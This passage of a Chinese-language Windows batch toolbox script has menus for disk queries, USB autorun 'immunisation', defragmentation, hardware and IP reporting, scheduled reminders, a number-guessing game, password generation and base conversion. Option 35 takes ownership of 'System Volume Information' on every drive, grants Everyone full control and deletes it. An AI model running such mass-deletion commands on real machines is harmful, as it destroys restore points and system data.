fsutil fsinfo ntfsinfo %ntfsjxx%:
echo _______________________________________________________________________________
echo 按任意键返回&pause>nul
goto 24
:24(5)
title 查询REFS卷信息%system%
cls
echo _______________________________________________________________________________
fsutil fsinfo drives
echo _______________________________________________________________________________
set ntfsjxx=
set/p ntfsjxx=请输入要查询的驱动器:
cls
fsutil fsinfo refsinfo %ntfsjxx%:
echo _______________________________________________________________________________
echo 按任意键返回&pause>nul
goto 24
:24(6)
title 查询扇区信息%system%
cls
echo _______________________________________________________________________________
fsutil fsinfo drives
echo _______________________________________________________________________________
set ntfsjxx=
set/p ntfsjxx=请输入要查询的驱动器:
cls
fsutil fsinfo sectorinfo %ntfsjxx%:
echo _______________________________________________________________________________
echo 按任意键返回&pause>nul
goto 24
:25
title 创建指定大小的文件%system%
cls
echo 创建指定大小的文件(e=返回)
echo _______________________________________________________________________________
set cjlj=
set/p cjlj=请输入文件路径:
set cjlj="%cjlj:|=%"
if /i !cjlj!=="e" goto memuv2
set cjdx=
set/p cjdx=请输入文件大小(单位:字节):
set cjdx="%cjdx:|=%"
if /i !cjdx!=="e" goto memuv2
:24(6)
fsutil file createnew %cjlj% %cjdx%
echo _______________________________________________________________________________
echo 按任意键返回&pause>nul
goto 25
:26
title 免疫U盘病毒%system%
cls
echo 此功能针对U盘进行免疫，避免autorun类型的病毒自动启动
echo _______________________________________________________________________________
echo [1]启动U盘免疫
echo [2]取消U盘免疫
echo [0]返回菜单
echo _______________________________________________________________________________
choice /c 120 /n /m 请输入你的选择:
if "%errorlevel%" equ "1" goto 26(1)
if "%errorlevel%" equ "2" goto 26(2)
if "%errorlevel%" equ "3" goto memuv2
goto 26
set upanmy=
set/p upanmy=请输入你的选择:
set upanmy="%upanmy:|=%"
if !upanmy!=="1" goto 26(1)
if !upanmy!=="2" goto 26(2)
if !upanmy!=="0" goto memuv2
echo 请输入正确的选项！
ping/n 2 0.0>nul
goto 26
:26(1)
title 启动U盘免疫%system%
cls
echo 正在搜索可移动磁盘...
for /f "delims=" %%a in ('"fsutil fsinfo drives"') do (set sypf=%%a)
set sypf=%sypf:~5%
for %%l in (%sypf%) do (
fsutil fsinfo drivetype %%l|find /i "可移动驱动器"&&goto 26-3)
cls
echo 没有找到可移动磁盘
echo _______________________________________________________________________________
echo 按任意键返回&pause>nul
goto 26
:26-3
cls
for /f "delims=" %%a in ('"fsutil fsinfo drives"') do (set sypf=%%a)
set sypf=%sypf:~5%
for %%l in (%sypf%) do (
fsutil fsinfo drivetype %%l|find /i "可移动驱动器"&&takeown/f %%lautorun.inf
fsutil fsinfo drivetype %%l|find /i "可移动驱动器"&&echo y|cacls %%lautorun.inf /t /c /p everyone:f
fsutil fsinfo drivetype %%l|find /i "可移动驱动器"&&attrib -s -h -r %%lautorun.inf
fsutil fsinfo drivetype %%l|find /i "可移动驱动器"&&del/f/q %%lautorun.inf
fsutil fsinfo drivetype %%l|find /i "可移动驱动器"&&rd/s/q %%lautorun.inf
fsutil fsinfo drivetype %%l|find /i "可移动驱动器"&&md %%lautorun.inf
fsutil fsinfo drivetype %%l|find /i "可移动驱动器"&&md "%%lautorun.inf\免疫文件夹！请勿删除"
fsutil fsinfo drivetype %%l|find /i "可移动驱动器"&&md "%%lautorun.inf\免疫文件夹！请勿删除 / "
fsutil fsinfo drivetype %%l|find /i "可移动驱动器"&&echo y|cacls %%lautorun.inf /t /c /p everyone:r) 2>nul
echo;
echo _______________________________________________________________________________
echo U盘免疫完成
echo 按任意键返回&pause>nul
goto 26
:26(2)
title 取消U盘免疫%system%
cls
echo 正在搜索可移动磁盘...
for /f "delims=" %%a in ('"fsutil fsinfo drives"') do (set sypf=%%a)
set sypf=%sypf:~5%
for %%m in (%sypf%) do (
fsutil fsinfo drivetype %%m|find /i "可移动驱动器"&&goto 26-4)
cls
echo 没有找到可移动磁盘
echo _______________________________________________________________________________
echo 按任意键返回&pause>nul
goto 26
:26-4
cls
for /f "delims=" %%a in ('"fsutil fsinfo drives"') do (set sypf=%%a)
set sypf=%sypf:~5%
for %%m in (%sypf%) do (
fsutil fsinfo drivetype %%m|find /i "可移动驱动器"&&takeown/f %%mautorun.inf
fsutil fsinfo drivetype %%m|find /i "可移动驱动器"&&echo y|cacls %%mautorun.inf /t /c /p everyone:f
fsutil fsinfo drivetype %%m|find /i "可移动驱动器"&&attrib -s -h -r %%mautorun.inf
fsutil fsinfo drivetype %%m|find /i "可移动驱动器"&&del/f/q %%mautorun.inf
fsutil fsinfo drivetype %%m|find /i "可移动驱动器"&&rd/s/q %%mautorun.inf) 2>nul
echo _______________________________________________________________________________
echo 取消U盘免疫完成
echo 按任意键返回&pause>nul
goto 26
:27
title 磁盘碎片整理%system%
cls
echo _______________________________________________________________________________
echo [1]整理所有磁盘
echo [0]返回菜单
echo _______________________________________________________________________________
fsutil fsinfo drives
echo _______________________________________________________________________________
set fenxi=
set/p fenxi=请输入需要分析的盘符:
set fenxi="%fenxi:|=%"
if !fenxi!=="1" goto 27(1)
if !fenxi!=="0" goto memuv2
:27(4)
cls
defrag/a %fenxi%:
echo _______________________________________________________________________________
:27(3)
set zhengli=
set/p zhengli=是否开始磁盘碎片清理(y/n):
set zhengli="%zhengli:|=%"
if /i !zhengli!=="y" goto 27(2)
if /i !zhengli!=="n" goto 27
echo 请输入正确的选项！
ping/n 2 0.0>nul
goto 27(3)
:27(1)
cls
for /f "delims=" %%a in ('"fsutil fsinfo drives"') do (set sypf=%%a)
set sypf=%sypf:~5%
if /i "%system:~18,2%"=="XP" for %%n in (%sypf%) do defrag/v/x %%n
for %%n in (%sypf%) do defrag/u/v/x %%n
echo _______________________________________________________________________________
echo 按任意键返回&pause>nul
goto 27
:27(2)
cls
defrag/u/v/x %fenxi%:||defrag/v/x %fenxi%:
echo _______________________________________________________________________________
echo 按任意键返回&pause>nul
goto 27
:28
title 一键删除空文件夹%system%
cls
echo 检测Everything的安装路径与运行状态...
set flag=
set flag1=rem
for /f "delims=" %%a in ('"reg query "HKEY_LOCAL_MACHINE\SOFTWARE\voidtools\Everything" /v InstallLocation|find "InstallLocation""') do (set EverythingInstallPath=%%a)
if "%system:~8,2%"=="XP" (set EverythingInstallPath=%EverythingInstallPath:~27%) else (set EverythingInstallPath=%EverythingInstallPath:~33%)
if exist "%EverythingInstallPath%\Everything.exe" (tasklist /fi "status eq running" /fi "username eq "%username%"" /fi "imagename eq everything.exe"|find /i "Everything.exe"&&if exist "%EverythingInstallPath%\es.exe" set flag=rem&set flag1=)
cls
echo 注意:如果对系统盘进行操作可能会被杀毒软件拦截
echo _______________________________________________________________________________
fsutil fsinfo drives
echo _______________________________________________________________________________
set caozuo=
set/p caozuo=请输入需要操作的盘符或路径:
if not defined caozuo goto 28
set caozuo|findstr /i "\<[a-z]\>">nul
if "%errorlevel%" neq "0" goto 28-1
cls
echo 正在搜索空文件夹...     文件越多搜索时间越长
%flag% for /f "delims=" %%o in ('"dir/a/s/b/ad-l %caozuo%:|sort/r"') do rd/q "%%o"2>nul&&echo 已删除空文件夹%%o
rem %flag1% for /f "delims=" %%o in ('""%EverythingInstallPath%\es.exe" -sort path-descending /ad-l %caozuo%:"') do rd/q "%%o"2>nul&&echo 已删除空文件夹%%o
:loop1
%flag1% set empty=0
%flag1% for /f "delims=" %%o in ('""%EverythingInstallPath%\es.exe" %caozuo%: empty: ^!attrib:l"') do (
	rd /q "%%o"&&if !errorlevel! equ 0 (
		set empty=1
		已删除空文件夹%%o
	)
)
timeout /t 2 /nobreak>nul
%flag1% if "%empty%"=="1" goto loop1
goto 28(2)
:28-1
dir /ad "!caozuo!">nul 2>nul||echo 路径 !caozuo! 不是一个文件夹&&timeout /t 2 /nobreak>nul&&goto 28
echo 正在搜索空文件夹...     文件越多搜索时间越长
if "%caozuo:~0,1%%caozuo:~-1%" neq """" for /f "delims=" %%a in ('"echo %caozuo%"') do (set %caozuo%="%%~a")
%flag% for /f "delims=" %%o in ('"dir/a/s/b/ad-l %caozuo%|sort/r"') do rd/q "%%o"2>nul&&echo 已删除空文件夹%%o
rem %flag1% for /f "delims=" %%o in ('""%EverythingInstallPath%\es.exe" -sort path-descending /ad-l %caozuo%"') do rd/q "%%o"2>nul&&echo 已删除空文件夹%%o
:loop2
%flag1% set empty=0
%flag1% for /f "delims=" %%o in ('""%EverythingInstallPath%\es.exe" %caozuo% empty: ^!attrib:l"') do (
	rd /q "%%o"&&if !errorlevel! equ 0 (
		set empty=1
		echo;已删除空文件夹%%o
	)
)
timeout /t 2 /nobreak>nul
%flag1% if "%empty%"=="1" goto loop2
:28(2)
echo _______________________________________________________________________________
echo 空文件夹删除完成
echo 按任意键返回菜单&pause>nul
goto memuv2
:29
title ping测试网络延迟%system%
cls
set ping=
set pingcishu=
if exist %systemroot%\system32\curl.exe (ping /n 1 www.baidu.com>nul&if !errorlevel! equ 0 (rem set /p =本机IPV4地址: <nul
rem curl 4.ipw.cn
rem curl ipv4.ip.sb
curl https://myip.ipip.net
set /p =<nul
echo;))
if exist %systemroot%\system32\curl.exe (ping /n 1 240c::6666>nul&if !errorlevel! equ 0 (set /p =本机IPV6地址: <nul
curl 6.ipw.cn
::curl ipv6.ip.sb
echo;))
echo;
set/p ping=请输入目标IP或者网址:
set/p pingcishu=请输入ping次数:
echo;
echo 正在测试%ping%的网络延迟...
ping/n %pingcishu% %ping% /a
echo _______________________________________________________________________________
echo 按任意键返回菜单&pause>nul
goto memuv2
:30
title 硬件检测%system%
cls
set systemstarttime=
for /f "skip=2 tokens=2 delims==" %%a in ('Wmic OS Get LastBootUpTime /value') do (
    set systemstarttime=%%a
    echo;系统启动时间:	!systemstarttime:~0,4!年!systemstarttime:~4,2!月!systemstarttime:~6,2!日 !systemstarttime:~8,2!:!systemstarttime:~10,2!:!systemstarttime:~12,2!
    echo;
)
set systeminstalltime=
for /f "skip=2 tokens=2 delims==" %%a in ('Wmic OS Get InstallDate /value') do (
    set systeminstalltime=%%a
    echo;系统安装日期:	!systeminstalltime:~0,4!年!systeminstalltime:~4,2!月!systeminstalltime:~6,2!日 !systeminstalltime:~8,2!:!systeminstalltime:~10,2!:!systeminstalltime:~12,2!
    echo;
)
for /f "delims== tokens=2" %%a in ('"wmic cpu get name/value"') do set cpu=%%a
echo CPU: 		%cpu%
echo;
for /f "delims== tokens=2" %%a in ('"wmic cpu get processorid/value"') do set cpuid=%%a
echo CPU ID: 	%cpuid%
echo;
for /f "delims== tokens=2" %%a in ('"wmic cpu get numberofcores/value"') do set cpuhx=%%a
for /f "delims== tokens=2" %%a in ('"wmic cpu get numberOflogicalprocessors/value"') do set cpuxc=%%a
echo 		%cpuhx%核心%cpuxc%线程
echo;
for /f "delims== tokens=2" %%a in ('"wmic cpu get currentclockspeed/value"') do set cpuzp=%%aMHz
echo 主频: 		%cpuzp%
echo;
for /f "delims== tokens=2" %%a in ('"wmic cpu get datawidth/value"') do set cpuws=%%abit
echo 数据宽度: 	%cpuws%
echo;
for /f "delims== tokens=2" %%a in ('"wmic cpu get extclock/value"') do set cpuwp=%%aMHz
echo 外频: 		%cpuwp%
echo;
set ch=
for /f "skip= 2 tokens=2 delims==" %%a in ('"wmic path win32_cachememory get maxcachesize/value"') do (
    set /a "ch+=1"
    if !ch! equ 1 (
        set /a cpul1=%%a
    ) else (
        if !ch! equ 2 (
            set /a cpul2=%%a
        ) else (
            if !ch! equ 3 (
                set /a cpul3=%%a
            ) else (
                if !ch! equ 4 (
                    set /a cpul4=%%a
                )
            )
        )
    )
)
echo;一级缓存:	!cpul1! KB
echo;
call :xdwjs !cpul2! kb dw
echo;二级缓存:	!dw!
echo;
if "!cpul3!" neq "" (
    call :xdwjs !cpul3! kb dw
    echo;三级缓存:	!dw!
    echo;
) else (
    echo;三级缓存:	0
    echo;
)
if "!cpul4!" neq "" (
    call :xdwjs !cpul4! kb dw
    echo;四级缓存:	!dw!
    echo;
) else (
    echo;四级缓存:	0
    echo;
)
rem for /f "delims== tokens=2" %%a in ('"wmic cpu get l2cachesize/value"') do set cpul2=%%a
rem set cpul2|findstr "\<[0-9]*\>">nul
rem if "%errorlevel%" equ "0" call :dwjs %cpul2% 1
rem echo 二级缓存: 	%size% %dw%
rem echo;
rem for /f "delims== tokens=2" %%a in ('"wmic cpu get l3cachesize/value"') do set cpul3=%%a
rem set cpul3|findstr "\<[0-9]*\>">nul
rem if "%errorlevel%" equ "0" call :dwjs %cpul3% 1
rem echo 三级缓存: 	%size% %dw%)
echo _______________________________________________________________________________
set zhuban=,zhubanxh=
for /f "delims== tokens=2" %%a in ('"wmic baseboard get manufacturer/value"') do set zhuban=%%a
echo 主板制造商: 	%zhuban%
echo;
for /f "delims== tokens=2" %%a in ('"wmic baseboard get product/value"') do set zhubanxh=%%a
echo 主板型号: 	%zhubanxh%
echo;
set zbuuid=
for /f "skip=2 tokens=2 delims==" %%a in ('Wmic Csproduct Get Uuid /Value') do (
    echo;主板UUID:	%%a
    echo;
)
set bioszzs=,biosbb=,bioszzrq
for /f "delims== tokens=2" %%a in ('"wmic bios get manufacturer/value"') do set bioszzs=%%a
echo BIOS制造商: 	%bioszzs%
echo;
for /f "delims== tokens=2" %%a in ('"wmic bios get smbiosbiosversion/value"') do set biosbb=%%a
echo BIOS版本: 	%biosbb%
echo;
for /f "delims== tokens=2" %%a in ('"wmic bios get releasedate/value"') do set bioszzrq=%%a
echo BIOS制造日期: 	%bioszzrq:~0,4%年%bioszzrq:~4,2%月%bioszzrq:~6,2%日
echo _______________________________________________________________________________
set xsqxh=,xsqzzs=,fbl1=,fbl2=
for /f "delims== tokens=2" %%a in ('"wmic desktopmonitor get name/value"') do set xsqxh=%%a
echo 显示器型号: 	%xsqxh%
echo;
for /f "delims== tokens=2" %%a in ('"wmic desktopmonitor get monitormanufacturer/value"') do set xsqzzs=%%a
echo 显示器制造商: 	%xsqzzs%
echo;
for /f "delims== tokens=2" %%a in ('"wmic path win32_videocontroller get currenthorizontalresolution/value"') do set fbl1=%%a
for /f "delims== tokens=2" %%a in ('"wmic path win32_videocontroller get currentverticalresolution/value"') do set fbl2=%%a
echo 分辨率: 	%fbl1% x %fbl2%
echo _______________________________________________________________________________
set xkxc=,xsms=,sxl=,qdrq=,qdbb=
set /p =显卡: 		<nul&for /f "delims=" %%a in ('"wmic path win32_videocontroller get name|find /i /v "name""') do echo %%a|find /i /v "echo"
for /f "delims== tokens=2" %%a in ('"wmic path win32_videocontroller get adapterram/value"') do set xkxc=%%a
call :xdwjs %xkxc% b dw
echo;
echo 显存容量: 	%dw%
echo;
for /f "delims== tokens=2" %%a in ('"wmic path win32_videocontroller get videomodedescription/value"') do set xsms=%%a
echo 当前显示模式: 	%xsms%
echo;
for /f "delims== tokens=2" %%a in ('"wmic path win32_videocontroller get currentrefreshrate/value"') do set sxl=%%aHz
echo 当前刷新率: 	%sxl%
echo;
for /f "delims== tokens=2" %%a in ('"wmic path win32_videocontroller get driverdate/value"') do set qdrq=%%a
echo 驱动日期: 	%qdrq:~0,4%年%qdrq:~4,2%月%qdrq:~6,2%日
echo;
for /f "delims== tokens=2" %%a in ('"wmic path win32_videocontroller get driverversion/value"') do set qdbb=%%a
echo 驱动版本: 	%qdbb%
echo _______________________________________________________________________________
echo 硬盘型号:
for /f "delims=" %%a in ('"wmic diskdrive get model|find /i /v "model""') do echo %%a|find /i /v "echo"
echo;
echo 接口类型:
for /f "delims=" %%a in ('"wmic diskdrive get interfacetype|find /i /v "interfacetype""') do echo %%a|find /i /v "echo"
echo;
echo 硬盘容量:
for /f "delims=" %%a in ('"wmic diskdrive get size|find /i /v "size""') do (call :xdwjs %%a b dw
if "!dw!" neq "0" echo !dw!)
echo;
echo 总扇区数:
for /f "delims=" %%a in ('"wmic diskdrive get totalsectors|find /i /v "totalsectors""') do echo %%a|find /i /v "echo"
echo;
echo 分区数:
for /f "delims=" %%a in ('"wmic diskdrive get partitions|find /i /v "partitions""') do echo %%a|find /i /v "echo"
fsutil fsinfo drives
wmic logicaldisk get name,volumename,description,filesystem,size,freespace
echo _______________________________________________________________________________
echo 打印机制造商:
for /f "delims== tokens=2" %%a in ('"Wmic Printer where "Default^='TRUE'" get caption /value"') do (echo %%a)
echo;
echo 打印机型号:
for /f "delims== tokens=2" %%a in ('"Wmic Printer where "Default^='TRUE'" get drivername /value"') do (echo %%a)
echo;
echo 声卡:
for /f "delims=" %%a in ('"wmic sounddev get name|find /i /v "name""') do echo %%a|find /i /v "echo"
echo;
echo 网卡:
for /f "delims== tokens=2" %%a in ('"Wmic Path Win32_NetworkAdapterConfiguration WHERE "IPEnabled^='TRUE'" get description /value"') do (echo %%a)
echo;
set netspeed=
for /f "skip=2 tokens=2 delims==" %%a in ('Wmic path Win32_PerfFormattedData_Tcpip_NetworkInterface get CurrentBandwidth /value') do (
    set netspeed=%%a
    set /a "netspeed=netspeed/1000000"
    echo;当前网络连接速度:      !netspeed! Mbps
    echo;
)
echo 网关地址:
for /f "delims== tokens=2" %%a in ('"Wmic Path Win32_NetworkAdapterConfiguration WHERE "IPEnabled^='TRUE'" get defaultipgateway /value"') do (set mrwg=%%a
set mrwg=!mrwg:~0,-1!
if "!mrwg!" equ "" goto mrwgtc
set mrwg=!mrwg:{=!
set mrwg=!mrwg:}=!
set mrwg=!mrwg:"=!
set mrwg=!mrwg:,=	!
echo !mrwg!)
:mrwgtc
echo;
echo IP:
if exist %systemroot%\system32\curl.exe (ping /n 1 www.baidu.com>nul&&curl 4.ipw.cn) else (for /f "skip=12 tokens=4 delims=: " %%a in ('"netsh interface Teredo show state"') do (echo %%a))
echo;
for /f "delims== tokens=2" %%a in ('"Wmic Path Win32_NetworkAdapterConfiguration WHERE "IPEnabled^='TRUE'" get ipaddress /value"') do (set ipdz=%%a
set ipdz=!ipdz:{=!
set ipdz=!ipdz:}=!
set ipdz=!ipdz:"=!
set ipdz=!ipdz:,=	!
echo !ipdz!)
echo;
echo MAC:
for /f "delims== tokens=2" %%a in ('"Wmic Path Win32_NetworkAdapterConfiguration WHERE "IPEnabled^='TRUE'" get macaddress /value"') do (set macdz=%%a
set macdz=!macdz:{=!
set macdz=!macdz:}=!
set macdz=!macdz:"=!
echo !macdz!)
echo _______________________________________________________________________________
echo 内存容量:
for /f "delims== tokens=2" %%a in ('"wmic memorychip get capacity /value"') do (call :xdwjs %%a b dw
if "!dw!" neq "0" echo !dw!)
echo 内存频率:
for /f "delims== tokens=2" %%a in ('"wmic memorychip get speed /value"') do (set ncpl=%%a
echo !ncpl:~0,-1! MHz)
systeminfo|find /i "内存"
echo _______________________________________________________________________________
mode
echo _______________________________________________________________________________
echo 按任意键返回菜单&pause>nul
goto memuv2
:31
title 读心术%system%
cls
echo 想一个大于0且小于128的数(不包括128)
echo _______________________________________________________________________________
pause
cls
:d0c
for /l %%a in (1,2,127) do set/p=%%a   <nul
echo;
choice /c YN /n /m 请问这里有你想的数吗?(Y=有,N=没有)[1\7]
if "%errorlevel%" equ "1" set /a num=1
if "%errorlevel%" equ "2" set /a num=0
set a=2
set b=3
cls
:d1c
for /l %%a in (%a%,1,%b%) do (set/p=%%a   <nul
set/a a=a+2
set/a b=b+2)
if %b% lss 128 goto d1c
echo;
choice /c YN /n /m 请问这里有你想的数吗?(Y=有,N=没有)[2\7]
if "%errorlevel%" equ "1" set /a num=num+2
if "%errorlevel%" equ "2" set /a num=num
set c=4
set d=7
cls
:d2c
for /l %%a in (%c%,1,%d%) do (set/p=%%a   <nul
set/a c=c+2
set/a d=d+2)
if %d% lss 128 goto d2c
echo;
choice /c YN /n /m 请问这里有你想的数吗?(Y=有,N=没有)[3\7]
if "%errorlevel%" equ "1" set /a num=num+4
if "%errorlevel%" equ "2" set /a num=num
set e=8
set f=15
cls
:d3c
for /l %%a in (%e%,1,%f%) do (set/p=%%a   <nul
set/a e=e+2
set/a f=f+2)
if %f% lss 128 goto d3c
echo;
choice /c YN /n /m 请问这里有你想的数吗?(Y=有,N=没有)[4\7]
if "%errorlevel%" equ "1" set /a num=num+8
if "%errorlevel%" equ "2" set /a num=num
set g=16
set h=31
cls
:d4c
for /l %%a in (%g%,1,%h%) do (set/p=%%a   <nul
set/a g=g+2
set/a h=h+2)
if %g% lss 128 goto d4c
echo;
choice /c YN /n /m 请问这里有你想的数吗?(Y=有,N=没有)[5\7]
if "%errorlevel%" equ "1" set /a num=num+16
if "%errorlevel%" equ "2" set /a num=num
set i=32
set j=63
cls
:d5c
for /l %%a in (%i%,1,%j%) do (set/p=%%a   <nul
set/a i=i+2
set/a j=j+2)
if %j% lss 128 goto d5c
echo;
choice /c YN /n /m 请问这里有你想的数吗?(Y=有,N=没有)[6\7]
if "%errorlevel%" equ "1" set /a num=num+32
if "%errorlevel%" equ "2" set /a num=num
set k=64
set l=127
cls
:d6c
for /l %%a in (%k%,1,%l%) do (set/p=%%a   <nul
set/a k=k+2
set/a l=l+2)
if %l% lss 128 goto d6c
echo;
choice /c YN /n /m 请问这里有你想的数吗?(Y=有,N=没有)[7\7]
if "%errorlevel%" equ "1" set /a num=num+64
if "%errorlevel%" equ "2" set /a num=num
cls
echo 经过电脑复杂的计算后,得出你大脑里想的那个数是:!cswz!41;92m %num% !cswz!!ysbak!
echo _______________________________________________________________________________
echo 按任意键返回菜单&pause>nul
goto memuv2
:32
title DOS闹钟%system%
cls
echo _______________________________________________________________________________
echo [1]定时提醒指定内容
echo [2]定时运行指定文件
echo [3]显示已有的计划任务
echo [4]删除计划任务
echo [0]返回菜单
echo _______________________________________________________________________________
set nzxx=
set/p nzxx=请输入你的选择:
set nzxx="%nzxx:|=%"
if !nzxx!=="1" goto 32(1)
if !nzxx!=="2" goto 32(2)
if !nzxx!=="3" goto 32(3)
if !nzxx!=="4" goto 32(4)
if !nzxx!=="0" goto memuv2
echo 请输入正确的选项！
ping/n 2 0.0>nul
goto 32
:32(1)
title 定时提醒指定内容%system%
cls
set txnrmc=
set/p txnrmc=请指定任务名称:
echo _______________________________________________________________________________
set txnr=
set/p txnr=请输入你需要提醒的内容:
echo _______________________________________________________________________________
set txnrrq=
set/p txnrrq=请设置提醒日期(格式: yyyy/mm/dd 例如2015/08/05):
echo _______________________________________________________________________________
set txnrsj=
set/p txnrsj=请设置提醒时间(格式: hh:mm:ss 例如09:03:05):
cls
md %systemdrive%\DOS工具箱临时目录>nul 2>nul
echo 该文件夹是DOS工具箱的临时文件夹,删除后将无法提醒已有的内容！>%systemdrive%\DOS工具箱临时目录\说明.txt
echo @echo off>"%systemdrive%\DOS工具箱临时目录\%txnrmc% - 定时提醒文件.bat"
echo title %txnrmc%>>"%systemdrive%\DOS工具箱临时目录\%txnrmc% - 定时提醒文件.bat"
echo color f1>>"%systemdrive%\DOS工具箱临时目录\%txnrmc% - 定时提醒文件.bat"
echo echo >>"%systemdrive%\DOS工具箱临时目录\%txnrmc% - 定时提醒文件.bat"
echo cls>>"%systemdrive%\DOS工具箱临时目录\%txnrmc% - 定时提醒文件.bat"
echo echo 提醒内容:"%txnr%">>"%systemdrive%\DOS工具箱临时目录\%txnrmc% - 定时提醒文件.bat"
echo echo _______________________________________________________________________________>>"%systemdrive%\DOS工具箱临时目录\%txnrmc% - 定时提醒文件.bat"
echo echo 该文件由DOS工具箱 - 定时提醒指定内容功能生成>>"%systemdrive%\DOS工具箱临时目录\%txnrmc% - 定时提醒文件.bat"
echo echo 生成时间:%date:~0,4%年%date:~5,2%月%date:~8,2%日 %xingqi% %time:~0,8%>>"%systemdrive%\DOS工具箱临时目录\%txnrmc% - 定时提醒文件.bat"
echo echo _______________________________________________________________________________>>"%systemdrive%\DOS工具箱临时目录\%txnrmc% - 定时提醒文件.bat"
echo echo 按任意键退出^&pause^>nul>>"%systemdrive%\DOS工具箱临时目录\%txnrmc% - 定时提醒文件.bat"
schtasks /create /tn "%txnrmc%" /tr "%systemdrive%\DOS工具箱临时目录\%txnrmc% - 定时提醒文件.bat" /st %txnrsj% /sd %txnrrq% /sc once&&echo 任务将在%txnrrq% %txnrsj%运行
echo 提醒文件已保存至"%systemdrive%\DOS工具箱临时目录\%txnrmc% - 定时提醒文件.bat"
echo _______________________________________________________________________________
echo 按任意键返回菜单&pause>nul
goto 32
:32(2)
title 定时运行指定文件%system%
cls
set dsyxmc=
set/p dsyxmc=请指定任务名称:
echo _______________________________________________________________________________
set dsyxlj=
set/p dsyxlj=请拖动需要定时运行的文件到此窗口:
if "%dsyxlj:~0,1%%dsyxlj:~-1%" neq """" for /f "delims=" %%a in ('"echo %dsyxlj%"') do (set %dsyxlj%="%%~a")
echo _______________________________________________________________________________
set dsyxrq=
set/p dsyxrq=请设置提醒日期(格式: yyyy/mm/dd 例如2015/08/05):
echo _______________________________________________________________________________
set dsyxsj=
set/p dsyxsj=请设置提醒时间(格式: hh:mm:ss 例如09:03:05):
cls
md %systemdrive%\DOS工具箱临时目录>nul 2>nul
echo 该文件夹是DOS工具箱的临时文件夹,删除后将无法提醒已有的内容！>%systemdrive%\DOS工具箱临时目录\说明.txt
echo "%dsyxlj%">"%systemdrive%\DOS工具箱临时目录\%dsyxmc% - 定时运行文件.bat"
schtasks /create /tn "%dsyxmc%" /tr "%systemdrive%\DOS工具箱临时目录\%dsyxmc% - 定时运行文件.bat" /st %dsyxsj% /sd %dsyxrq% /sc once&&echo 任务将在%dsyxrq% %dsyxsj%运行
echo 启动文件已保存至"%systemdrive%\DOS工具箱临时目录\%dsyxmc% - 定时运行文件.bat"
echo _______________________________________________________________________________
echo 按任意键返回菜单&pause>nul
goto 32
:32(3)
title 显示已有的计划任务%system%
cls
schtasks /query
echo _______________________________________________________________________________
echo 按任意键返回菜单&pause>nul
goto 32
:32(4)
title 删除计划任务%system%
cls
schtasks /query
echo _______________________________________________________________________________
set rwsc=
set/p rwsc=请输入要删除的任务名称:
cls
schtasks /delete /tn "%rwsc%" /f
del/f/q "%systemdrive%\DOS工具箱临时目录\%rwsc% - 定时提醒文件.bat"2>nul
del/f/q "%systemdrive%\DOS工具箱临时目录\%rwsc% - 定时运行文件.bat"2>nul
dir/a/s %systemdrive%\DOS工具箱临时目录\*.bat>nul 2>nul||rd/s/q %systemdrive%\DOS工具箱临时目录
echo _______________________________________________________________________________
echo 按任意键返回菜单&pause>nul
goto 32
:33
title 计时器%system%
cls
echo 计时器精确度0.01秒
echo _______________________________________________________________________________
echo 按任意键开始计时(不建议跨天计时)&pause>nul
set kssjbk=%time%
cls
echo 计时器已开始计时,按任意键停止计时.&pause>nul
set jssjbk=%time%
call :sjc "%kssjbk%" "%jssjbk%"
cls
echo 计时开始时间:%kssjbk%
echo 计时结束时间:%jssjbk%
echo _______________________________________________________________________________
echo 用时:%sjc:~0,2%时%sjc:~2,2%分%sjc:~4,2%.%sjc:~6,2%秒
echo 按任意键返回菜单&pause>nul
goto memuv2
:34
title 随机密码生成器%system%
cls
set mmws=
set mmxz=
set mmjg=
set mmjs=aA0bB1cC2dD3eE4fF5gG6hH7iI8jJ9kK0lL1mM2nN3oO4pP5qQ6rR7sS8tT9uU0vV1wW2xX3yY4zZ5
set/p mmws=请输入生成的密码位数:
:34(1)
cls
for /l %%a in (1,1,%mmws%) do (set/a mmxz=!random!%%63
for %%b in (!mmxz!) do set mmjg=!mmjg!!mmjs:~%%b,1!)
echo 已生成的随机密码:
echo %mmjg%
echo _______________________________________________________________________________
echo 按任意键返回菜单&pause>nul
goto memuv2
:35
title 删除每个盘符下的System Volume Information文件夹%system%
cls
echo 按任意键开始删除System Volume Information文件夹&pause>nul
cls
for /f "delims=" %%a in ('"fsutil fsinfo drives"') do (set sypf=%%a)
set sypf=%sypf:~5%
for %%a in (%sypf%) do (
takeown/f "%%aSystem Volume Information" 2>nul
echo y|cacls "%%aSystem Volume Information" /t /c /p everyone:f 2>nul
rd/s/q "%%aSystem Volume Information"2>nul)
echo;
echo _______________________________________________________________________________
echo 删除完成
echo 按任意键返回菜单&pause>nul
goto memuv2
:36
title 二进制转换器%system%
set shijinzhi=
set erjinzhi=
set shilioujinzhi=
set shijinzhibak=
set shijinzhibak2=
set shijinzhibak3=
set bajinzhi=
cls
echo 最大支持2147483647的十进制转换
echo _______________________________________________________________________________
echo [1]输入十进制转换
echo [2]输入二进制转换
echo [0]返回菜单
echo _______________________________________________________________________________
choice /c 120 /n /m 请输入你的选择:
if "%errorlevel%" equ "1" goto 10z
if "%errorlevel%" equ "2" goto 2z
if "%errorlevel%" equ "3" goto memuv2
goto 36
set zhxz=
set/p zhxz=请输入你的选择:
set zhxz="%zhxz:|=%"
if !zhxz!=="1" goto 10z
if !zhxz!=="2" goto 2z
if !zhxz!=="0" goto memuv2
echo 请输入正确的选择!
ping/n 2 0.0>nul
goto 36
:10z
cls
set shijinzhi=
set/p shijinzhi=请输入十进制整数:
for /f "delims=0123456789" %%a in ('echo %shijinzhi%') do goto shijinzhicw
set shijinzhibak=%shijinzhi%
set shijinzhibak2=%shijinzhibak%
set shijinzhibak3=%shijinzhibak2%
:36(1)
set/a e=shijinzhi%%2
set/a shijinzhi=shijinzhi/2
set erjinzhi=%e%%erjinzhi%
if %shijinzhi% neq 0 goto 36(1)
:36(2)
set/a b=%shijinzhibak%%%8
set/a shijinzhibak=%shijinzhibak%/8
set bajinzhi=%b%%bajinzhi%
if %shijinzhibak% neq 0 goto 36(2)
:36(3)
set/a s=%shijinzhibak3%%%16
if "%s%"=="10" set s=A
if "%s%"=="11" set s=B
if "%s%"=="12" set s=C
if "%s%"=="13" set s=D
if "%s%"=="14" set s=E
if "%s%"=="15" set s=F
set/a shijinzhibak3=%shijinzhibak3%/16
set shilioujinzhi=%s%%shilioujinzhi%
if %shijinzhibak3% neq 0 goto 36(3)
cls
echo 十进制:%shijinzhibak2%
echo 二进制:%erjinzhi%
echo 八进制:%bajinzhi%
echo 十六进制:%shilioujinzhi%
